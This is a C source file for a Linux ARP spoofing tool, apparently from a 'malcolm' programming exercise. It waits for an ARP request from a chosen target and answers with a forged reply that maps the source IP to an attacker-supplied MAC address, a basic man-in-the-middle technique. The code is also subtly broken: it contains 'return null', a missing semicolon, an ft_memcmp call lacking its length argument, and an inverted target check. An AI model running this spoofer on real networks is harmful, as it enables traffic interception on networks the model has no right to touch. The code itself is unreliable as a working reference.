#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include "ft_status.h"
#include "malcolm_validator.h"
#include "ft_spoof.h"
#include "parser.h"
#include "libft.h"

char   *chooseInterface(void)
{
    struct ifaddrs  *ifaddr, *ifa; //for network interfaces
    char            *interface_name;

    if (getifaddrs(&ifaddr) < 0)
    {
        perror("Can't get network interfaces");
        return null;
    }

    for(ifa = ifaddr; ifa; ifa = ifa->ifa_next)
    {
        if(!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_PACKET)
        {
            continue;
        }
        if (ft_strncmp(ifa->ifa_name, "lo", sizeof(ifa->ifa_name)) == 0)
        {
            continue;
        }
        printf("found interface: %s\n", ifa->ifa_name);
        interface_name = ft_strdup(ifa->ifa_name);
        break;
    }
    freeifaddrs(ifaddr);
    return interface_name;
}

int     is_arp_request_from_target(uint8_t *ip_rqst, uint8_t *mac_rqst, uint8_t *ip_target, uint8_t *mac_target)
{
    if (ft_memcmp(ip_rqst, ip_target, IP_LEN) != 0 || ft_memcmp(mac_rqst, mac_target) != 0)
    {
        return 1;
    }
    return 0;
}

int     is_arp_request_for_source(uint8_t *ip_rqst, uint8_t *ip_src) {
    if (ft_memcmp(ip_rqst, ip_src, IP_LEN) != 0)
    {
        return 0;
    }
    else
    {
        return 1;
    }
}

int     send_arp_response(struct spoofaddrs addrs, struct ft_ethhdr *eth, struct ft_arphdr *arp, struct sockaddr_ll to, int sock)
{
    struct ft_arpbody   response;
    uint8_t             tmpip[IP_LEN];
    int                 sentlen;
    socklen_t           addrlen;

    addrlen = sizeof(struct sockaddr_ll)
    printf("Sending ARP response to target\n");

    ft_memcpy(eth->trgt_mac, eth->src_mac, MAC_LEN);
    ft_memcpy(eth->src_mac, addrs.mac_source, MAC_LEN);

    ft_memcpy(arp->tha, arp->sha, MAC_LEN);
    ft_memcpy(arp->sha, addrs.mac_source, MAC_LEN);
    ft_memcpy(tmpip, arp->spa, IP_LEN);
    ft_memcpy(arp->spa, arp->tpa, IP_LEN);
    ft_memcpy(arp->tpa, tmpip, IP_LEN);

    response.arp.op = htons(ARPOP_REPLY);
    response.eth = *eth;
    response.arp = *arp;

    sentlen = sendto(sock, &response, sizeof(struct ft_arpbody), 0, (struct sockaddr *)&to, addrlen);
    if (sentlen <= 0)
    {
        perror("Can't send ARP response");
        return CANT_SEND_ARP_RESPONSE;
    }
    printf("ARP response sent!\n");
    return SUCCESS;
}

int     spoof(struct spoofaddrs addrs, int sock)
{
    char                done, buf[sizeof(struct ft_ethhdr) + sizeof(struct ft_arphdr)];
    int                 reclen;
    struct sockaddr_ll  from;
    socklen_t           fromlen;
    struct ft_ethhdr    *eth;
    struct ft_arphdr    *arp;
    uint16_t            ptype, opcode;

    fromlen = sizeof(struct sockaddr_ll);
    done = 0;

    printf("waiting for ARP request\n");
    while (!done)
    {
        reclen = recvfrom(sock, buf, ETH_FRAME_LEN, 0, (struct sockaddr *)&from, &fromlen);
        if(reclen < 0)
        {
            perror("ERROR: Can't receive message");
            close(sock);
            exit(CANT_RECEIVE_MESSAGE);
        }
        
        eth = (struct ft_ethhdr *)buf;
        ptype = ntohs(eth->type);
        arp = (struct ft_arphdr *) (buf + sizeof(struct ft_ethhdr));
        opcode = ntohs(arp->op);
        if (!(ptype == ETHERTYPE_ARP && opcode == ARPOP_REQUEST))
        {
            continue;
        }

        if (
                is_arp_request_from_target(arp->spa, arp->sha, addrs.ip_target, addrs.mac_target)
                &&
                is_arp_request_for_source(arp->tpa, addrs.ip_source)
        )
        {
            printf("ARP request from target to source received!\n");
            done = send_arp_response(addrs, eth, arp, from, sock) == SUCCESS;
        }
    }
    return SUCCESS;
}

int     main(int argc, char** argv)
{
    int                 validation_result, sock;
    char                *interface_name;
    struct spoofaddrs   spaddrs;

    validation_result = validate_args(argc, argv);
    if (validation_result != SUCCESS) {
        return validation_result;
    }

    parse_ip_v4(argv[1], spaddrs.ip_source);
    parse_ip_v4(argv[3], spaddrs.ip_target);
    parse_mac(argv[2], spaddrs.mac_source);
    parse_mac(argv[4], spaddrs.mac_target);
    
    interface_name = chooseInterface();

    if (interface_name)
    {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0)
        {
            perror("Can't open socket");
            return CANT_OPEN_SOCKET;
        }
        spoof(spaddrs, sock);
    }

    close(sock);
    return SUCCESS;
}
